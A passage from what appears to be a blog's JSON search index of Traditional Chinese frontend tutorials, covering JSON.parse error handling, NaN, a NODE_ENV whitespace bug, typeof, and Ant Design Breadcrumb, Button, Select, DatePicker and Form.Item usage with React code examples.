之前","text":"更嚴謹的做法。 錯誤示範12let str = '[123'let json = JSON.parse(str) // SyntaxError: Unexpected end of JSON input 更好的做法加上 try catch： 1234567891011let str = '[123'try { // 正確的處理 let json = JSON.parse(str) console.log(json)} catch (error) { // 錯誤的處理 console.log('出錯啦') console.log(error)}console.log('不會被中斷，還是可以執行') 備註：catch 中的 error 是把錯誤訊息「字串」給印出來，不是中斷執行。 所以就算 JSON.parse 出錯你的程式也不會直接掛掉，並且能良好的對「正確」跟「錯誤」各別處理。","link":"/2022/01/08/about-json-parse/"},{"title":"關於 NaN 這個東西","text":"奇妙的東西～ 簡述這邊先強調一下： NaN 不是一種資料型態 NaN 不是一種資料型態 NaN 不是一種資料型態 NaN 其實是一個 number： 12console.log(typeof NaN); // numberconsole.log(Number('abc')); // NaN 只不過它有一個很奇葩的現象： 12const a = Number('abc') // NaNconsole.log(a === a) // false 居然有變數不等於變數自己的情況？沒錯，這就是 NaN 的特性，它不等於任何人，即便是它自己。 所以就特別記一下就好，NaN 就是個特殊的 case。如果你真的要檢查一個變數是不是 NaN 可以用 isNaN 來檢查： 123console.log(isNaN(NaN)); // trueconsole.log(isNaN('abc')); // trueconsole.log(isNaN('123')); // false '123' 這個 case 你能想成是這樣： 1console.log(isNaN(Number('123'))); 這樣就不會覺得困惑了。","link":"/2022/03/06/about-nan/"},{"title":"關於 NODE_ENV 的地雷","text":"一個會懷疑人生的 bug。 簡述在講 bug 之前先幫你複習一下 NODE_ENV 的用法： 到 package.json 設定 script 123456{ \"scripts\": { \"test\": \"jest\", \"start\": \"set NODE_ENV=hello &amp;&amp; node index.js\" }} 到對應的檔案裡面寫 JS 12// index.jsconsole.log('my NODE_ENV: ' + process.env.NODE_ENV); 最後用 npm run 的方式來執行（只有透過這種方式才能存取到寫在 script 中的環境變數） 1npm run start 輸出結果： 1my NODE_ENV: hello 看起來很合理，但這時候如果你這樣寫： 1console.log('is equal: ', process.env.NODE_ENV === 'hello'); // true / false ? 我本來也想說不就 true 嗎？內容一樣，型別也正確，有什麼好 false 的？ 但是，結果確實是 false。 揭開幕後就直接說吧，其實是因為「空白字元」的關係： 1234567{ \"scripts\": { \"test\": \"jest\", // NODE_ENV=hello（空格）&amp;&amp;（空格）node index.js \"start\": \"set NODE_ENV=hello &amp;&amp; node index.js\" }} 你可以試著用 JSON.stringify 印出來看就知道原因了： 12NODE_END: \"hello \" // &lt;- 結尾多一個空格My string: \"hello\" 所以結論就是空白字元的關係才導致 false 的，把空格拿掉就正常了： 123456{ \"scripts\": { \"test\": \"jest\", \"start\": \"set NODE_ENV=hello&amp;&amp; node index.js\" }} 123console.log('NODE_END: ', JSON.stringify(process.env.NODE_ENV));console.log('My string: ', JSON.stringify('hello'));console.log('Is equal: ', process.env.NODE_ENV === 'hello'); 輸出結果： 123NODE_END: \"hello\"My string: \"hello\"Is equal: true 所以以後在用這種東西時，最好確保 &amp;&amp; 前後沒出現空白字元，不然就會像我一樣被雷的不要不要的。","link":"/2022/04/02/about-node-env/"},{"title":"關於 typeof 和資料型態","text":"小知識。 簡述在談 typeof 前，先來複習一下 JS 的資料型態。 JavaScript 裡的資料型態可以分成兩大類，一個是「Primitive」，一個是「Object」。 Primitive String Number Boolean undefined null symbol Object Object Array Function 最後也複習一下，Primitive 都屬於 Immutable（不可以改變）。 你不可能去改原本的值，除非你重新賦值。來看個例子： 123const str = 'hello';str.toUpperCase(); // 回傳一個新的字串console.log(str); // 'hello' 還是原本的值 那 mutable 呢？最簡單的例子就是 Array 123const arr = [1];arr.push(2); // 這才是真的改變原本的值console.log(arr); // [1, 2] 查看型態的方法所以如果要看一個變數的資料型態，通常會用 typeof 來看： 123console.log(typeof 'abc'); // string console.log(typeof 123); // numberconsole.log(typeof true) // boolean 可是有些案例比較特別，例如說 Array、Function 和 Null： 123console.log(typeof []); // Objectconsole.log(typeof Function a () { return a}); // Functionconsole.log(typeof null); // Object 所以 typeof 沒有辦法很精準的檢查型態。網路有一張表有列出每個變數 typeof 的值是什麼，有興趣可以自己查。 那該怎麼解決呢？留到後面在告訴你，這邊先來看一下 null 這個特別的型態。 null 其實是個廣為人知的 Bug，沒有修正是怕改了很多東西會壞掉。而會有這 bug 是因為 JS 底層在實作 type 時會用「tag」來表示一個變數的型態。Object 的 tag 是 0，而 null 通常是用指標（0x00），所以就也被當成 0，得到 Object 的結果。 有沒有更嚴謹的檢查方式？如果是 Array 的話，可以改用這個方法： 1console.log(Array.isArray([])); // true 不過要注意，比較舊的瀏覽器不支援。 所以如果想更保險的話，可以用下面這個做法： Object.prototype.toString.call(data) 123456// [object Number]console.log(Object.prototype.toString.call(1));// [object Array]console.log(Object.prototype.toString.call([]));// [object Null]console.log(Object.prototype.toString.call(null));","link":"/2022/03/06/about-typeof/"},{"title":"Ant Design－Breadcrumb","text":"突然懷念起以前手刻麵包屑的時光。 最基本的結構基本結構會由 &lt;Breadcrumb&gt; 包 &lt;Breadcrumb.Item&gt; 來組成。 而 &lt;Breadcrumb.Item&gt; 裡面可以放我們想放的元件，例如 &lt;a&gt; 或 &lt;Link&gt;。 123456789101112131415161718192021222324import React from 'react'import { Breadcrumb } from 'antd'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; &lt;Breadcrumb&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App 輸出結果： 因為是麵包屑，所以最後一個 item 會自動加上 active 的樣式（最後一個等於目前所在位置），不用自己做處理。 指定間隔符可以用 separator 這個屬性來處理： 12345678910111213141516171819202122232425import React from 'react'import { Breadcrumb } from 'antd'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; {/* 指定為 &gt; */} &lt;Breadcrumb separator='&gt;'&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App 當然也可以放入元件： 1234567891011121314151617181920212223242526import React from 'react'import { Breadcrumb } from 'antd'import { CaretRightOutlined } from '@ant-design/icons'function App() { return ( &lt;&gt; &lt;h2&gt;Bread crumb&lt;/h2&gt; {/* 放入 icon 元件 */} &lt;Breadcrumb separator={&lt;CaretRightOutlined /&gt;}&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;App&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;List&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Detail&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;/&gt; )}export default App 輸出結果： 與 React 路由做連結這個我覺得剛開始碰的話有點小複雜，所以不太懂的話建議跟著實作看看。 先來看一下最後的成果： 主要的思路是這樣： 取得目前所在的路徑 把路徑拆開來，例如 /app/list， 會被拆成 ['app', list] 利用第二步的陣列來產生網址 ['app', 'list'] =&gt; /app、/app/list 建立一個 map，一個網址會對應到一個名稱（用來顯示在麵包屑上的） 利用上面產生的「網址」和「map」來產生麵包屑元件 接著就來看 code 吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import React from 'react'import { Breadcrumb } from 'antd'import { CaretRightOutlined } from '@ant-design/icons'import { Routes, Route, Link, Outlet, useLocation } from 'react-router-dom'import Home from './Home'import App from './App'import List from './List'import Detail from './Detail'interface NameMap { [key: string]: string}// 用來做映射的 mapconst breadcrumbNameMap: NameMap = { '/app': 'App', '/app/list': 'List', '/app/list/detail': 'Detail'}function Main() { const location = useLocation() // 抓出目前的路徑（首頁的話會是空字串，所以會用 filter 過濾掉） const pathSnippets = location.pathname.split('/').filter((i) =&gt; i) // 根據路徑來產生需要的元件 const extraBreadcrumbItems = pathSnippets.map((_, index) =&gt; { // 這邊的邏輯要想一下，可以看成這樣子： // 第一個麵包屑的連結是 /app，所以 = ['app', 'list'].slice(0, 1).join('/') // 第二個麵包屑的連結是 /app/list，所以 = ['app', 'list'].slice(0, 2).join('/') const url = `/${pathSnippets.slice(0, index + 1).join('/')}` // 最後把值填到麵包屑元件中（別忘了加上 key） return ( &lt;Breadcrumb.Item key={url}&gt; &lt;Link to={url}&gt;{breadcrumbNameMap[url]}&lt;/Link&gt; &lt;/Breadcrumb.Item&gt; ) }) // 首頁 + 上面產生的麵包屑（因為是陣列，所以別忘了加上 key） const breadcrumbItems = [ &lt;Breadcrumb.Item key={'Home'}&gt; &lt;Link to=''&gt;Home&lt;/Link&gt; &lt;/Breadcrumb.Item&gt; ].concat(extraBreadcrumbItems) return ( &lt;&gt; &lt;Breadcrumb style={{ marginBottom: '30px' }} separator={&lt;CaretRightOutlined /&gt;} &gt; {/* 最後把產生好的 item 放進來就可以了 */} {breadcrumbItems} &lt;/Breadcrumb&gt; &lt;Routes&gt; &lt;Route path='' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;Home /&gt;} /&gt; &lt;Route path='app' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;App /&gt;} /&gt; &lt;Route path='list' element={&lt;Outlet /&gt;}&gt; &lt;Route path='' element={&lt;List /&gt;} /&gt; &lt;Route path='detail' element={&lt;Detail /&gt;} /&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Route&gt; &lt;/Routes&gt; &lt;/&gt; )}export default Main 至於路由的部分看不太懂的話，可以參考我之前寫的這篇。 另一種做法，抽出去當成一個元件剛剛的做法其實有個問題，就是沒辦法處理「動態路由」的 mapping。 回顧一下，當時 map 的部分我們是這樣寫的： 123456// 用來做映射的 mapconst breadcrumbNameMap = { '/app': 'App', '/app/list': 'List', '/app/list/detail': 'Detail'} 問題在於，如果現在網址是 /app/list/:id 的話，map 要怎麼寫？好像就沒辦法了，雖然硬要的話是可以寫成這樣： 123456789101112131415const breadcrumbNameMap = { '/app': 'App', '/app/list': 'List'}// 擷出路徑片段const pathSnippets = location.pathname.split('/').filter((i) =&gt; i)// 檢查最後一個片段是不是數字if (parseInt(pathSnippets[pathSnippets.length - 1], 10)) { // 加上動態路由的 map for (let i = 1; i &lt;= parseInt(pathSnippets[pathSnippets.length - 1], 10); i++) { breadcrumbNameMap[`/app/list/${i}`] = `List of ${i}` }} 附註：有興趣的話可以到這邊參考範例 雖然這也不失為一種做法，不過如果想更有彈性一些的話，可以試著用「抽出去變成元件」這種思維來做。 這會有點類似 HOC 的感覺。簡單來說，我們可以自製一個元件，它會接收一個 props，這個 props 要包含這些資訊： 12345type Paths = { url: string // 網址 labal: string // 顯示在麵包屑上的文字 access: boolean // 用來決定要顯示連結 or 純文字} 而這元件就會根據 props 來產生對應的麵包屑元件： 123456789101112131415161718192021222324252627282930313233343536import { Breadcrumb } from 'antd'import { Link } from 'react-router-dom'import React from 'react'export type Paths = { url: string label: string access: boolean}interface Props { paths: Paths[]}const PageBreadcrumb: React.FC&lt;Props&gt; = ({ paths }) =&gt; { // 根據 props 產生麵包屑 item const Breadcrumbitems = paths.map((path) =&gt; { return ( &lt;Breadcrumb.Item key={path.url}&gt; {path.access ? &lt;Link to={path.url}&gt;{path.label}&lt;/Link&gt; : path.label} &lt;/Breadcrumb.Item&gt; ) }) // 把做好的麵包屑回傳 return ( &lt;Breadcrumb style={{ marginBottom: '30px' }} &gt; {Breadcrumbitems} &lt;/Breadcrumb&gt; )}export default PageBreadcrumb 接著只要在對應的元件上使用就行了： 123456789101112131415161718192021222324252627282930313233343536373839import React from 'react'import { Link } from 'react-router-dom'import PageBreadcrumb, { Paths } from '../PageBreadcrumb'const List: React.FC = () =&gt; { const breadcrumpPaths: Paths[] = [ { url: '/', label: 'Home', access: true }, { url: '/app', label: 'App', access: true }, { url: '/app/list', label: 'List', access: true } ] return ( &lt;&gt; &lt;PageBreadcrumb paths={breadcrumpPaths} /&gt; &lt;ul&gt; {Array.from({ length: 10 }, (_, index) =&gt; { return ( &lt;li key={index}&gt; &lt;Link to={(index + 1).toString()}&gt;List item {index + 1}&lt;/Link&gt; &lt;/li&gt; ) })} &lt;/ul&gt; &lt;/&gt; )}export default List 這樣的缺點是每一個頁面都得各別處理麵包屑元件，但換來的好處是可以有更大的彈性。總之我覺得要用哪一種方法都可以，端看你偏好哪個，最後一樣附上範例。","link":"/2022/05/16/antd-breadcrumb/"},{"title":"Ant Design－使用 Button 時可能會碰到的地雷","text":"埋藏玄機的地雷。 簡述這是我自己在工作上踩到的一個地雷，原先在 debug 的過程中以為是 Antd 設計上的問題，一直到最後找出答案時才發現這似乎跟 React 的渲染機制有點相關，總之讓我們來重現一下當時的情境吧。 這邊要做的是這樣的功能： 簡單來說就是一個能切換編輯和閱讀的表單而已，然後在編輯時會出現「Reset」這個按鈕。 實作的原始碼如下： 123456789101112131415161718192021222324252627import React, { useState } from 'react'import 'antd/dist/antd.css'import './index.css'import { Button, Input, Form } from 'antd'const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; &lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App 附註：CodeSandbox 發現問題剛剛的範例如果仔細使用的話會發現一個問題，那就是「每當我按下 Edit 時內容會自動被 reset」： 看起來就像是自動被執行了 reset 一樣？為了找出問題我們可以在 &lt;Form&gt; 加上 onReset 來檢查看看： 1234567891011121314151617// 加上 log 來確認是否被執行&lt;Form onReset={() =&gt; console.log('onReset')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; &lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt;&lt;/Form&gt; 果然不出所料，每當我們按下 Edit 按鈕時 onReset 都會印出訊息，也就是說每次按下 Edit 時都會重新 reset 內容。 不過這是為什麼呢？當時我第一個懷疑的點是 reset 這個按鈕： 1&lt;Button htmlType='reset'&gt;Reset&lt;/Button&gt; 所以我試著把按鈕拿掉來測試看看，果真沒有出現再出現 reset 的情形。 雖然問題解決了，但我還是覺得很奇怪，為什麼只是切換而已就會觸發 reset？於是我後來又多做了幾項測試，才發現了一個關鍵點，這是從 Antd 的按鈕中發現的。 我們先來看段範例，再來解釋一下我發現了什麼。 底下是一個切換按鈕的範例，簡單來說就是根據 state 來顯示不同的按鈕而已，非常簡單： 123456789101112131415function App() { const [isEdit, setIsEdit] = useState(false) return ( &lt;div className='wrapper'&gt; {isEdit ? ( &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; )}export default App 用看的就大概知道會發生什麼了對吧？不過請仔細看看下面的演示，看能不能從中發現什麼： 想好的話再往下看吧。 我是防雷線… 我是防雷線… 我是防雷線… 我是防雷線… 我是防雷線… 按鈕確實有依照我們想的去做切換，不過你有沒有發現到 按鈕的 active 狀態（樣式） 也被保留下來了呢？這個就是關鍵點。 當我們把按鈕從 Edit 切換成 Cancel 時，照理來說應該要是一個「全新的按鈕」，換句話說就是沒有被點擊過，所以不該有 active 的狀態。 不過 React 為了節省一些開銷，所以在重新渲染時的實際流程是這樣： 把新的跟舊的按鈕做比對 把真正需要更新的內容給替換掉 這樣子的機制就有機率出現像上面這種「按鈕被更新了，但卻保留了原本的內容（active 狀態）」的問題。 附註：在 Vue 裡面其實也會出現類似的問題，可以參考這個範例。 總之最後繞了一大圈才發現原來整個問題的原因跟 React 渲染機制有關，真的是恍然大悟啊~ 解決問題既然知道問題是出在渲染上的話，那解法自然也很清楚了。 要避免 React 重用原本的 DOM 元素的話，只要在該元素上加上 key 就行了： 123456789101112131415161718192021function App() { const [isEdit, setIsEdit] = useState(false) return ( &lt;div className='wrapper'&gt; {isEdit ? ( // 加上 key &lt;Button key='cancel' onClick={() =&gt; setIsEdit(false)}&gt; Cancel &lt;/Button&gt; ) : ( // 加上 key &lt;Button key='edit' onClick={() =&gt; setIsEdit(true)}&gt; Edit &lt;/Button&gt; )} &lt;/div&gt; )}export default App 這樣子就會強制讓 React 不要用「更改內容」的方式來重新渲染，而是直接「重新渲染這個 DOM 元素」，換句話說就是「我每一次都要重新產生這個按鈕，就算有其他類似的按鈕我也不要拿來用，我就是要完完全全是全新的一個啦（任性？）」。 修改完後再測一次，就不會再出現 active 的樣式了： 因為每一次都是一個全新的按鈕，所以不會在這個按鈕身上看到任何其他按鈕的影子，他永遠會是他自己而已。 回歸到最開始的範例複習一下最原本的範例，之所以會發生那樣的問題就是因為「按鈕被重複使用」的關係，複習一下這張圖： 有注意到 Edit 按下以後切換到新的按鈕時，Reset 也保留了 active 的樣式嗎？這樣代表 Reset 就是拿 Edit 來改的意思。 這個時候呢，因為 Reset 按鈕有 htmlType=\"reset\" 這個 props，所以就會觸發「把表單重置」的預設行為，所以表單就被重置了。 所以如果你把 Reset 跟 Save 的位置交換的話，就會發現變成觸發 htmlType=\"submit\" 的預設行為： 1234567891011121314151617181920212223242526const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form onReset={() =&gt; console.log('reset')} onFinish={() =&gt; console.log('submit')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; {/* 把 Save 放到最前面 */} &lt;Button htmlType='submit'&gt;Save&lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='reset' onClick={() =&gt; console.log('click')}&gt; Reset &lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App 所以就跟前面說的一樣，只要把該重新渲染的元素加上 key 就可以解決了： 12345678910111213141516171819202122232425262728const App = () =&gt; { const [isEdit, setIsEdit] = useState(false) return ( &lt;Form onReset={() =&gt; console.log('reset')} onFinish={() =&gt; console.log('submit')}&gt; &lt;div className='demo-form-options'&gt; {isEdit ? ( &lt;&gt; {/* 加上 key */} &lt;Button key='submit' htmlType='submit'&gt; Save &lt;/Button&gt; &lt;Button onClick={() =&gt; setIsEdit(false)}&gt;Cancel&lt;/Button&gt; &lt;Button htmlType='reset' onClick={() =&gt; console.log('click')}&gt; Reset &lt;/Button&gt; &lt;/&gt; ) : ( &lt;Button onClick={() =&gt; setIsEdit(true)}&gt;Edit&lt;/Button&gt; )} &lt;/div&gt; &lt;Form.Item name='username' label='Username'&gt; &lt;Input disabled={!isEdit} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; )}export default App 附註：CodeSandbox","link":"/2022/09/23/antd-button-problem/"},{"title":"Ant Design－客製化 Select","text":"Antd 的彈性真的蠻大的。 簡述直接來看想做出的效果： 我希望在選項中新增一個「Add Option」的選項，並且對這個選項做一些 CSS 設定。第一個會碰到的問題是： 我該怎麼用 selector 指到選項啊？ 我們可以先來觀察 DOM 結構，首先能看到 Popup 的下拉選單預設會渲染在 &lt;/body&gt; 之前： 知道結構後我們就能大概知道該把 className 加在哪裡了： popup 的容器元素 「Add Option」的選項 第一個地方可以用 dropdownClassName 這個 props 來設定： 1234567&lt;Select className='demo-select' dropdownClassName='demo-select-dropdown' options={list} onChange={onChange} value={selected}/&gt; 注意不要跟 className 搞混了，這個會設定到的位置是 select box 本身（那個框框），不是 popup 的 dropdown。 第二個地方則是能在 options 中多傳一個 className 的屬性： 12345678910111213141516171819const [list, setList] = useState([ { className: 'add', // 加上 className label: 'Add Option', value: 'add' }, { label: 'A', value: 'a' }, { label: 'B', value: 'b' }, { label: 'C', value: 'c' }]) 最後就可以在 CSS 中做設定囉： 123456789/* 選取框框的樣式 */.demo-select { min-width: 300px;}/* popup 的選項 */.demo-select-dropdown .add { color: dodgerblue; border-bottom: 1px solid #d4e3fc;} 這邊的完整範例可以到這邊參考。","link":"/2022/09/18/antd-customize-select/"},{"title":"Ant Design－DatePicker","text":"多練習多筆記。 基本取值如果要在選取日期後取出值，可以用 onChange 來當作 handler。 這個 handler 會被傳入： moment，沒猜錯的話應該就是這個東西，所以有需要可以參考相關的 API dateString，像這樣的格式字串：2022-05-31 12345678910111213import React from 'react'import { DatePicker, message } from 'antd'function Main() { // 回傳入 moment 物件，不過這邊沒辦法指定所以才設為 any const handleChange = (current: any, dateString: string): void =&gt; { message.info(current ? `You select date is ${current.format('YYYY-MM-DD')}` : 'Not choose') } return &lt;DatePicker onChange={handleChange} /&gt;}export default Main 限制範圍假設我有兩個選項，一個是「開始日期（Start）」，一個是「結束日期（End）」。 基本上都會希望能選取的範圍是 Start 不可以「大於」End，End 不可以「小於」Start 這樣的規則，所以可以這樣寫： 12345678910111213141516171819202122232425262728293031323334import React from 'react'import { Form, DatePicker } from 'antd'import { useForm } from 'antd/lib/form/Form'function Main() { const [form] = useForm() const getDisabledDateFrom = (current: moment.Moment): boolean =&gt; { // 如果 to 有值，把 to &lt; from 的 disabled return !form.getFieldValue('dateTo') ? false : form.getFieldValue('dateTo').valueOf() - 86400000 &lt; current.valueOf() } const getDisabledDateTo = (current: moment.Moment): boolean =&gt; { // 如果 from 有值，把 from &gt; to 的 disabled return !form.getFieldValue('dateFrom') ? false : form.getFieldValue('dateFrom').valueOf() + 86400000 &gt; current.valueOf() } return ( &lt;&gt; &lt;Form form={form} autoComplete='off' validateTrigger={['onBlur', 'onChnage']}&gt; &lt;Form.Item label='Date From' name='dateFrom'&gt; &lt;DatePicker disabledDate={getDisabledDateFrom} /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Date To' name='dateTo'&gt; &lt;DatePicker disabledDate={getDisabledDateTo} /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main 這邊可以用 disabledDate 這個 props 來實作，裡面要傳入一個 function，並根據它的回傳值來決定是否可選。 回傳 true 的會被禁用 回傳 false 的會被啟用 簡單來說是這樣子。 至於這個 function 什麼時候會被觸發？你可以想成是點開 DataPiacker 的時候，所以你就得在這個時候來做處理，拿「開始日期」的這一段來解釋： 12345678910const getDisabledDateFrom = (current: moment.Moment): boolean =&gt; { // 如果 to 有值，把 to &lt; from 的 disabled return !form.getFieldValue('dateTo') ? false : form.getFieldValue('dateTo').valueOf() - 86400000 &lt; current.valueOf()};&lt;Form.Item label='Date From' name='dateFrom'&gt; &lt;DatePicker disabledDate={getDisabledDateFrom} /&gt;&lt;/Form.Item&gt; 我希望點開的時候做兩件事： 先檢查「結束日期」有沒有值 form.getFieldValue('dateTo') 如果有值，把比他早的日期都禁用掉 沒有值的話，就不做任何事（retrun false） 這就是 getDisabledDateFrom 在做的事情。 裡面有用到 form 來取出欄位的值，這個是透過 useForm 來做的，有興趣可以參考 Ant Design－表單相關元件。 另外要順便提的是，DataPicker 的背其實後是透過 moment.js 來實作的，所以可以在 handler 中拿到 moment 這個物件，跟取欄位值的時候也是。總之只要利用相關的 method 來做處理，就能決定回傳 true / flase 了。 最後是個小補充，86400000 是一天的毫秒數，因為我不希望在 Start 選了 5/20 的時候 End 還可以選到 5/20（或反過來），所以才要往前 or 往後一天。","link":"/2022/05/21/antd-date-picker/"},{"title":"Ant Design－Form.Item","text":"很多好用的都藏在這。 常犯錯誤 當 Form.Item 設置 name 以後就無法再對表單獨自設定 value 值 當 Form.Item 被 re-render 時 onReset（&lt;Form&gt; 的 props） 也會被觸發 rules 只能在 Form.item 有設置 name 時才有效。 validate&lt;Form.Item&gt; 中有一個的 rule 的 props 可以傳，最常見的用法是這樣子： 123456789101112131415&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ { required: true, message: 'Phone number cannot be blank.' } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; 沒什麼，就只是一個必填項目的驗證而已。 不過當你碰到比較複雜的邏輯時，可能會想寫一些「驗證函式」來做自定義驗證，這個就是 validate 的適用時機。 他的寫法會長這樣： 1234567891011121314151617181920212223242526&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ // 陣列值是一個 function (form) =&gt; { // 這個 function 中可以拿到 form instance console.log('form instance', form) // 回傳一個物件，值為 validator（驗證函式） return { validator: (rule, value) =&gt; { console.log('rule', rule) console.log('value', value) // 回傳 Promise.resolve() / Promise.reject() 表示通過或未通過 return Promise.resolve() } } } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; 附註：雖然是回傳 Promise 但並不是「非同步」執行哦，你試著在裡面用 while 去跑「同步」延遲的話就能看到 blocking 的現象了。 寫法會比剛剛複雜一點，但主要是為了給你一些用來取得資訊的參數，所以才會看起來會寫很多層。 不過照著上面的註解來看應該就能理解了，例如我現在輸入 1 的話，就會印出這樣的結果： 所以現在如果我想驗證「電話號碼格式」的話就可以這樣子寫： 1234567891011121314151617181920212223242526272829303132&lt;Form form={form} labelCol={{ span: 24 }} wrapperCol={{ span: 24 }} onFinish={(values) =&gt; { console.log('values', values) }}&gt; &lt;Form.Item name='phone' label='Phone' rules={[ (form) =&gt; { return { validator: (rule, value) =&gt; { const pattern = /^[\\+]?[(]?[0-9]{3}[)]?[-\\s\\.]?[0-9]{3}[-\\s\\.]?[0-9]{4,6}$/ if (pattern.test(value)) { return Promise.resolve() } else { return Promise.reject() } }, message: 'Does not match the phone format.' } } ]} &gt; &lt;Input type='tel' /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; 此處範例：CodeSandbox dependencies簡單來說這個是拿來設定「當某個欄位更新時，我想重新驗證」的用途。 舉例來說，一般如果要做「確認密碼」的欄位時，你可能會這樣寫： 123456789101112131415161718192021222324252627282930313233function App() { return ( &lt;div className='wrapper'&gt; &lt;Form&gt; &lt;Form.Item name='password' label='Password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='confirmPassword' label='Confirm Password' rules={[ (form) =&gt; { return { // onChange 時會驗證是否跟原密碼相同 validator: (_, value) =&gt; { if (form.getFieldValue('password') === value) { return Promise.resolve() } else { return Promise.reject('does not match the password.') } } } } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App 這樣子確實會在不相等時顯示錯誤訊息，不過如果是下面這種情形呢？ 預設的行為是 Confirm Password 改變時會做驗證，可是在那之後如果又改變 Password 的話就不會觸發驗證了。 如果希望在這個時候也做驗證的話，可以對 Confirm Password 加上 dependencies 來處理： 12345678910111213141516171819202122232425262728293031323334function App() { return ( &lt;div className='wrapper'&gt; &lt;Form&gt; &lt;Form.Item name='password' label='Password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='confirmPassword' label='Confirm Password' dependencies={['password']} // 加上 dependencies rules={[ (form) =&gt; { return { validator: (_, value) =&gt; { console.log('validate') if (form.getFieldValue('password') === value) { return Promise.resolve() } else { return Promise.reject('does not match the password.') } } } } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App 這樣就可以達成預期的效果了： shouldUpdate它比較主要的用途有兩個： 優化效能（不需要利用 state 來重新渲染整個元件） 某個區塊是在特定情境下才會秀出來的 這邊來舉一個例子，假設我希望做出這樣的效果： 簡單來說就是表單能根據我目前選的產品來秀出不同項目給使用者選取，先附上這段的原始碼及 CodeSandbox： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function App() { const [form] = Form.useForm() const menu = [ { label: '奶茶', value: '奶茶' }, { label: '牛肉麵', value: '牛肉麵' }, { label: '雞排', value: '雞排' } ] const initValues = { 甜度: '無糖', 份量: '小碗', 酸菜: '不要', 